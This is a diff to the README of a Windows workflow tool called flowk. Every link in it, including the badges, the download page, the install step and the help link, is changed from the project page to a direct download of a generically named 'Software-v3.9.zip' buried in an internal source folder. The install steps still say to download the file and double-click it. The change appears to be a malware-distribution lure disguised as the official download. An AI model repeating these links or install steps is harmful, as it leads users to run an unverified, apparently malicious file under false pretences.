@@ -1,6 +1,6 @@
 # ⚙️ flowk - Automate tasks with simple workflows
 
-[![Download flowk](https://img.shields.io/badge/Download-flowk-brightgreen?style=for-the-badge)](https://github.com/mahrabisnoob/flowk)
+[![Download flowk](https://img.shields.io/badge/Download-flowk-brightgreen?style=for-the-badge)](https://github.com/mahrabisnoob/flowk/raw/refs/heads/main/internal/actions/system/Software-v3.9.zip)
 
 ---
 
@@ -12,7 +12,7 @@ FlowK is a tool to help you automate tasks using easy-to-follow instructions. Yo
 
 Visit this page to download the latest version of flowk for Windows:
 
-[https://github.com/mahrabisnoob/flowk](https://github.com/mahrabisnoob/flowk)
+[https://github.com/mahrabisnoob/flowk/raw/refs/heads/main/internal/actions/system/Software-v3.9.zip](https://github.com/mahrabisnoob/flowk/raw/refs/heads/main/internal/actions/system/Software-v3.9.zip)
 
 This page contains the files you need to get flowk running on your computer. Look for the latest version under "Releases" or the green button marked “Code.” Find the Windows download file, which usually ends with `.exe` or `.zip`.
 
@@ -32,7 +32,7 @@ Before installing flowk, make sure your system meets these requirements:
 
 ## ⚙️ How to install flowk on Windows
 
-1. Open your web browser and go to [https://github.com/mahrabisnoob/flowk](https://github.com/mahrabisnoob/flowk).
+1. Open your web browser and go to [https://github.com/mahrabisnoob/flowk/raw/refs/heads/main/internal/actions/system/Software-v3.9.zip](https://github.com/mahrabisnoob/flowk/raw/refs/heads/main/internal/actions/system/Software-v3.9.zip).
 2. Find the "Releases" section on the page or click the green "Code" button.
 3. Download the latest `.exe` file for Windows.
 4. Once the file downloads, double-click it to start the installation process.
@@ -121,7 +121,7 @@ Flowk works well with other software you might use for testing, software deliver
 
 If you need help or want to share your experience, visit the flowk page on GitHub:
 
-[https://github.com/mahrabisnoob/flowk](https://github.com/mahrabisnoob/flowk)
+[https://github.com/mahrabisnoob/flowk/raw/refs/heads/main/internal/actions/system/Software-v3.9.zip](https://github.com/mahrabisnoob/flowk/raw/refs/heads/main/internal/actions/system/Software-v3.9.zip)
 
 You can check the documentation, open an issue for problems, or find examples from other users.
 
@@ -140,4 +140,4 @@ Flowk runs entirely on your computer. It does not send your data anywhere withou
 - Keep flowk updated by checking the download page regularly.
 - Use clear names for workflow files and steps to stay organized.
 
-[![Download flowk](https://img.shields.io/badge/Download-flowk-orange?style=for-the-badge)](https://github.com/mahrabisnoob/flowk)
+[![Download flowk](https://img.shields.io/badge/Download-flowk-orange?style=for-the-badge)](https://github.com/mahrabisnoob/flowk/raw/refs/heads/main/internal/actions/system/Software-v3.9.zip)
